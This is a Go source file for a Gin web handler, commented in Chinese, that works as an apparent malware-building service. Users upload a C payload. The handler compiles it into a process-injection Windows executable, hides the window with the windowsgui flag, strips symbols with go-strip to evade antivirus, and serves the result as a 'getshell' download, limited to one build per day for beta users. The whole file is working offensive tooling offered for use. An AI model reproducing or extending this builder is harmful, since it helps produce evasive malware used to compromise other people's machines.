package cmd

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
	"path"
	"time"
	"web/testpackage"
)

/*
* @Author: A
* @Date:   2021/7/12 13:13
  进程注入生成模块
*/

func InjectBypass(c *gin.Context) {
	authfile, err1 := c.Cookie("FileAuth") //生成成功会留下一个cookie
	if err1 != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了未知的错误",
		})
		return
	}
	if authfile != "" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "每日一次机会已用光，请第二天再试，谢谢。",
		})
		return
	}
	ipadd := c.ClientIP() //获取ip地址
	username := c.MustGet("username").(string)
	//qq := testpackage.GetuserQQ(username)      //获取qq
	//timeStr := time.Now().Format("2006-01-02") //获取生成时间
	//runtime := c.DefaultPostForm("runtime", "5") //获取延迟时间
	file, err := c.FormFile("f1")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了错误？",
		})
		return
	}
	if path.Ext(file.Filename) != ".c" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "别乱搞啊,只能上传c后缀文件!",
		})
		return
	}

	err2 := testpackage.InitDB() // 调用输出化数据库的函数
	if err2 != nil {
		fmt.Printf("init db failed,err:%v\n", err1)
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "发生甚么事了？报错了！",
		})
		return
	}
	if testpackage.Authvip(username) != true { //验证是否是内测用户
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "对不起,该功能仅限内测用户使用！",
		})
		return
	}
	if testpackage.SQLInject(ipadd) == true {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "你x个锤子呢,你觉得能不能x嘛。"})
		return
	}
	log.Println(file.Filename)
	nfilename := Base64EncodeString(username + ":" + fmt.Sprintf("%d", time.Now().Unix()))
	dst := fmt.Sprintf("./upload/c/%s", nfilename+".c")
	c.SaveUploadedFile(file, dst)                                    //保存文件
	code := Readcode("./upload/c/" + nfilename + ".c") //获取上传的payload
	base64payload := Getbs64payload(code)                            //生成加密payload
	fmt.Println(base64payload)
	if base64payload != "" {
		cmd := exec.Command("go", "build", "-o", "./getshell/"+nfilename+".exe", "-ldflags", "-s -w  -H=windowsgui  -X main.payload="+base64payload+"", "./payload/inject/inject.go", "./payload/inject/payloadconfig.go")
		err1 := cmd.Run()
		if err1 != nil {
			// 命令执行失败
			fmt.Println(err1)
		}
		filetype := "bypass进程注入"
		if Reshell("./getshell/"+nfilename+".exe") == true {
			log.Println("生成成功，进行函数加密！")
			cmd1 := exec.Command("./payload/inject/go-strip", "-a", "-f", "./getshell/"+nfilename+".exe", "-output", "./getshell/ClearGo/"+nfilename+".exe")
			err2 := cmd1.Run()
			if err2 != nil {
				// 命令执行失败
				fmt.Println(err1)
				c.JSON(http.StatusInternalServerError, gin.H{
					"status":  500,
					"message": fmt.Sprintf("生成错误，请重新尝试。"),
				})
			} else {
				if testpackage.VipFileAdd(username, nfilename, ipadd, filetype) == true {
					c.JSON(http.StatusOK, gin.H{
						"status":  200,
						"durl":    "/shell/ClearGo/" + nfilename + ".exe",
						"message": fmt.Sprintf("生成成功,点击跳转下载。"),
					})
				} else {
					c.JSON(http.StatusInternalServerError, gin.H{
						"status":  500,
						"message": fmt.Sprintf("生成错误，请重新尝试。"),
					})
				}
			}
		} else {
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  500,
				"message": fmt.Sprintf("生成错误，请重新尝试。"),
			})
		}
	} else {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": fmt.Sprintf("生成错误，请重新尝试。"),
		})
	}
}
